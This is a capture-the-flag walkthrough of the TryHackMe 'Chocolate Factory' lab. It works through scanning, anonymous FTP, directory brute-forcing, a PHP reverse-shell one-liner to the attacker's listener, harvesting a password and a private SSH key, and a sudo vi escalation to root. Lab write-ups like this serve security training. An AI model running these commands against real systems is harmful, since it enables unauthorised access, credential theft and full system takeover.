# Chocolate Factory

**Room Link:** [https://tryhackme.com/room/chocolatefactory](https://tryhackme.com/room/chocolatefactory)



### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5) (3) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (22) (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (29) (1) (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (23) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (6) (1) (4).png" alt=""><figcaption></figcaption></figure>

### TCP/21 - FTP

**Kali**

```
ftp $VICTIM
Username: anonymous
>binary
>passive
>mget *
```

<figure><img src="../../.gitbook/assets/image (30) (3).png" alt=""><figcaption></figcaption></figure>

### TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (25) (2).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can run commands here and we see the key\_rev\_key file

![](<../../.gitbook/assets/image (2) (8).png>)



We go there by the url and we can download it

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
strings key_rev_key
```

<figure><img src="../../.gitbook/assets/image (24) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>





### Web Shell

**Web**

```
php -r '$sock=fsockopen("$KALI",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

<figure><img src="../../.gitbook/assets/image (3) (1) (2).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvp 4444
```

Get autocomplete

```
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```

<figure><img src="../../.gitbook/assets/image (27) (1) (2).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
cd /var/www/html/
grep password *
```

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (3).png" alt=""><figcaption></figcaption></figure>

### Shell

I was not able to su into charlie with the password, the credentials did work for the web login but it just brought me to the command page.

**Victim**

```
cd /home/charlie/
cat teleport
```

I copied the teleport private key to kali

**Kali**

```
subl teleport 
chmod 700 teleport
ssh -i teleport charlie@$VICTIM  
```

<figure><img src="../../.gitbook/assets/image (2) (2).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation

**Exploit Link:** [https://gtfobins.github.io/gtfobins/vi/](https://gtfobins.github.io/gtfobins/vi/)

Charlie can run vi with no passwd so I just followed the link above to become root

**Victim**

```
sudo -l
sudo vi -c ':!/bin/sh' /dev/null
```

<figure><img src="../../.gitbook/assets/image (5) (3).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (4) (8).png" alt=""><figcaption></figcaption></figure>



























































